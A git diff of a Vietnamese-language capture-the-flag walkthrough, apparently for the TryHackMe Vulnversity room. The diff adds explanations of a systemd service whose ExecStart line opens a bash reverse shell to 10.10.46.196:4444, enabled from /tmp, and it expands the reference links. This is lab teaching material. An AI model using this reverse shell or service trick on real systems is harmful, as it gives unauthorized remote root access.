@@ -105,6 +105,8 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.46.196/4444 0>&1'
 [Install]
 WantedBy=multi-user.target
 ```
+    + `/bin/bash -c` : thực thi shell
+    + `bash -i >& /dev/tcp/10.10.46.196/4444 0>&1` : Reverse shell (trong reference)
 + Chạy lệnh
 ```
 systemctl enable /tmp/hehe.service
@@ -121,7 +123,9 @@ Done
 --- 
 > Author : dangdh11
 
-> Reference : https://gtfobins.github.io/
+> Reference :
+`Reverse shell : https://www.netsparker.com/blog/web-security/understanding-reverse-shells/`
+https://gtfobins.github.io/
 https://blog.tryhackme.com/vulnversity/
 https://github.com/3ndG4me/KaliLists/tree/master/dirb
 https://github.com/OJ/gobuster
